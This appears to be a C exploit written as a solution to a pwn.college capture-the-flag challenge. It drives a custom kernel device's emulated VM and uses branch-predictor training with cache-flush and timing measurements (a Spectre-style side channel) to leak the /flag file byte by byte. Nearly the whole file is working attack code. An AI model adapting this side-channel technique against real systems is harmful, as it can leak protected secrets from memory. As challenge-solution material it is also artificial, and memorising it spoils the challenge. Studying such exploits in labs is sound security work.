#define _GNU_SOURCE

#include <stdio.h>
#include <sched.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <semaphore.h>
#include <x86intrin.h>

#include "vm_instr.h"

#define PAGE_SIZE 0x1000
#define MEMLIM 0x80

#define ZERO_OUT 0x555059
#define FILENAME "/flag"
#define FLAG_PREFIX "pwn.college"
#define FLAGLEN  58 
#define START 32
#define END 0x7f

#define REPEAT_PER_CHAR 1000000
#define THRESHOLD 200
#define TRAIN_FOR 16

struct instruction* output;

struct page_data {
    char data[PAGE_SIZE];
}* page_ptr = NULL;

static int dev_fd;

#define COMM      do {ioctl(dev_fd, 0x539, 0);
                      /* */
#define COMM_END      memset((void*)page_ptr, 0, 0xff * 3); \
                      set_output_idx(0);                    \
                  } while(0);

#define COMM_AND_END COMM COMM_END

#define for_each_char(var) for (int var = START; var < END; var++)

void set_cpu(int cpu_num)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu_num, &set);
    sched_setaffinity(0, sizeof set, &set);
}

size_t measure(void* ptr)
{
//    printf("ptr: %p\n", ptr);
    register void* reg_ptr asm("rdi") = ptr;
    size_t start, end;
    _mm_lfence();

    start = __rdtsc();
    _mm_lfence();

    asm volatile("mov r8, qword ptr [%0]"
                :
                : "r" (reg_ptr)
                : "r8", "memory"
                );
    _mm_lfence();

    end   = __rdtsc();

    return end - start;
}

void exploit(size_t i)
{
    interpret_imm(A,i);
    interpret_sys(EXEC | EXIT, D);
}

void flush_pages(int start, int end)
{
    for (int i = start; i < end; i++)
        _mm_clflush(&page_ptr[i]);
}

void init_yan(void)
{
    set_output_idx(0);
    ((uint32_t*)page_ptr)[0] = ZERO_OUT;
    ((uint32_t*)page_ptr)[1] = 0xff;
    COMM_AND_END
}

void train_exec()
{
    interpret_imm(A, 1);
    interpret_stm(A, A);
    for (int i = 0; i < TRAIN_FOR; i++)
        interpret_sys(EXEC, D);
}

size_t get_threshold(void)
{
#define KNOWN_DATA FLAG_PREFIX
#define NUM 8 // sizeof KNOWN_DATA-1

    flush_pages(1, 0x80);
    size_t sum = 0, time = 0;
    size_t uncached = 0, cached = 0;
    for (int i = 1; i <= NUM; i++)
    {
        time = measure(&page_ptr[i]);   
//        printf("Iter #%3d time: %zu\n", i, time);
        uncached += time;
    }


    for (int i = 1; i <= NUM; i++)
    {
        time = measure(&page_ptr[i]);   
//        printf("Iter #%3d time: %zu\n", i, time);
        cached += time;
    }

    return (uncached + cached) / ( NUM * 2 );

    for (int i = 1; i <= NUM; i++)
    {
        volatile int mix_i = ((i * i) * 2);
        mix_i = ( mix_i / i ) ^ 1;
        mix_i ^= 1;
        mix_i /= 2;

        interpret_imm(B, mix_i);
        interpret_stm(B, B);

        exploit(mix_i);
        _mm_clflush(&page_ptr[mix_i]);
        _mm_mfence();
        COMM

        /*
        train_exec();
        exploit(MEMLIM+i);
        _mm_clflush(get_page_ptr(KNOWN_DATA[i]));
        COMM;
        */

        time = measure(&page_ptr[mix_i]);
        COMM_END;

        sum += time;
        printf("Iter #%3d time: %zu\n", i, time);
    }

    printf("uncached: %zu; cached: %zu; yan touched: %zu\n\n\n",
            uncached / NUM, cached / NUM, sum / NUM);

    return cached / NUM;
}

int process_data(size_t hits[END], size_t i);
void setup_flag(void);
void zero_out_mem(void);

int main(int argc, char** argv)
{
    char flag[FLAGLEN+1] = {0};
    size_t hits[END], threshold, cpu = 0;
    int i = 0;

AGAIN:

    dev_fd = open("/proc/ypu", O_RDWR);
    if (dev_fd < 0) {
        perror("open");
        exit(1);
    }

    page_ptr = mmap(NULL, 0x100000, 
                    PROT_WRITE | PROT_READ,
                    MAP_SHARED | MAP_POPULATE,
                    dev_fd, 0);
    if (page_ptr == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
    output = (void*) page_ptr;

    init_yan();
    setup_flag();
    zero_out_mem();


    set_cpu((cpu++ % 2) - 1);
    threshold = get_threshold();
//    if (threshold > THRESHOLD)
//        goto AGAIN;
    printf("threshold: %zu\n", threshold);

    for (; i < (int) sizeof flag; i++) 
    {
        if (flag[i]) continue;

        memset(hits, 0, (sizeof *hits) * END);

        for (int _ = 0; _ < REPEAT_PER_CHAR; _++) 
        {
            for (int __ = 0; __ < TRAIN_FOR; __++) {
                train_exec();
                interpret_sys(EXIT, D);
                COMM_AND_END
            }
            train_exec();

            exploit(MEMLIM + i);
            flush_pages(START, END);
            COMM;

            for_each_char(j)
            {
                volatile int mix_j = ((j * j) * 2);
                mix_j = ( mix_j / j ) ^ 1;
                mix_j ^= 1;
                mix_j /= 2;

                size_t time = measure(&page_ptr[mix_j]);
                if (time <= threshold)
                    hits[mix_j] += 1;
            }

            COMM_END;
        }

        flag[i] = process_data(hits, i);
        if (flag[i]) {
            printf("\n\n - %c with hits of %zu - \n\n", flag[i], hits[flag[i]]);
        }
    }

    printf("flag: ");
    fflush(stdout);
    write(STDOUT_FILENO, flag, FLAGLEN);
    write(STDOUT_FILENO, "\n\n", 2);

    write(STDERR_FILENO, flag, FLAGLEN);
    write(STDERR_FILENO, "\n", 1);


    if (memcmp(flag, FLAG_PREFIX, sizeof FLAG_PREFIX-1)) {
        memset(flag, 0, FLAGLEN);

        i = 0;
        goto AGAIN;
    }

    for (i = sizeof FLAG_PREFIX-2; i <= FLAGLEN; i++) 
    {
        if (!flag[i]) {
            munmap(page_ptr, 0x100000);
            close(dev_fd);
            goto AGAIN;
        }
    }
}

int process_data(size_t hits[END], size_t i)
{
    size_t max_hits = 0;
    int ch = 0;
    for_each_char(j)
    {
        size_t hit = hits[j];
        if (hit)
            printf("%2zu/%3d (%c) - hits: %ld\n", i, j, j, hit);
        if (hit && max_hits < hit) {
            max_hits = hit;
            ch = j;
        }
    }

    return ch;
}

void setup_flag(void)
{
    // filename to mem
    for (int i = 0; i < sizeof FILENAME; i++) {
        interpret_imm(D, FILENAME[i]);
        interpret_stk(0, D);
    }

    // open filename
    interpret_imm(A, 1);
    interpret_imm(B, O_RDWR);
    interpret_imm(C, 0);
    interpret_sys(OPEN, D);

    // read from the open file to mem[MEMLIM]
    interpret_imm(A, 0);
    interpret_imm(B, MEMLIM);
    interpret_imm(C, FLAGLEN);
    interpret_sys(READ_MEM, D);

    interpret_imm(A, 1);
    interpret_sys(EXIT, 1);

    COMM_AND_END
}

void zero_out_mem(void)
{
    interpret_imm(C, 0);
    interpret_stm(C, C);
    for (int i = 0; i < MEMLIM-1; i++)
        interpret_stk(0, C);

    interpret_imm(A, 1);
    interpret_sys(EXIT, 1);

    COMM_AND_END
}
